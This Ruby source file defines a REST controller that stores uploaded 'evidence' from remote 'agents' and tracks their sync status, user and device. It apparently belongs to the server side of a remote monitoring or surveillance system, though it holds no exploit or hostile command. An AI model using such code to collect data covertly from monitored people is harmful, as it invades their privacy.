#
# Controller for the Evidence objects
#

require_relative '../db_layer'
require_relative '../evidence_manager'
require_relative '../evidence_dispatcher'

# rcs-common
require 'rcs-common/symbolize'
require 'eventmachine'
require 'em-http-request'

# system
require 'time'
require 'json'

module RCS
module DB

class EvidenceController < RESTController

  # this must be a POST request
  # the instance is passed as parameter to the uri
  # the content is passed as body of the request
  def create
    require_auth_level :server, :tech

    ident = @params['_id'].slice(0..13)
    instance = @params['_id'].slice(15..-1)

    # save the evidence in the db
    begin
      id = RCS::DB::EvidenceManager.instance.store_evidence ident, instance, @request[:content]
      # notify the worker
      RCS::DB::EvidenceDispatcher.instance.notify id, ident, instance
    rescue Exception => e
      trace :warn, "Cannot save evidence: #{e.message}"
      return RESTController.reply.not_found
    end

    trace :info, "Evidence saved. Dispatching evidence of [#{ident}::#{instance}][#{id}]"
    return RESTController.reply.ok({:bytes => @request[:content].size})
  end
  
  # used to report that the activity of an instance is starting
  def start
    require_auth_level :server
    
    # create a phony session
    session = @params.symbolize
    
    # retrieve the agent from the db
    agent = Item.where({_id: session[:bid]}).first
    return RESTController.reply.not_found if agent.nil?
    
    # convert the string time to a time object to be passed to 'sync_start'
    time = Time.at(@params['sync_time']).getutc

    # update the stats
    agent.stat[:last_sync] = time
    agent.stat[:last_sync_status] = RCS::DB::EvidenceManager::SYNC_IN_PROGRESS
    agent.stat[:source] = @params['source']
    agent.stat[:user] = @params['user']
    agent.stat[:device] = @params['device']
    agent.save
    
    return RESTController.reply.ok
  end
  
  # used to report that the processing of an instance has finished
  def stop
    require_auth_level :server

    # create a phony session
    session = @params.symbolize

    # retrieve the agent from the db
    agent = Item.where({_id: session[:bid]}).first
    return RESTController.reply.not_found if agent.nil?

    agent.stat[:last_sync_status] = RCS::DB::EvidenceManager::SYNC_IDLE
    agent.save

    return RESTController.reply.ok
  end

  # used to report that the activity on an instance has timed out
  def timeout
    require_auth_level :server

    # create a phony session
    session = @params.symbolize

    # retrieve the agent from the db
    agent = Item.where({_id: session[:bid]}).first
    return RESTController.reply.not_found if agent.nil?

    agent.stat[:last_sync_status] = RCS::DB::EvidenceManager::SYNC_TIMEOUTED
    agent.save

    return RESTController.reply.ok
  end

end

end #DB::
end #RCS::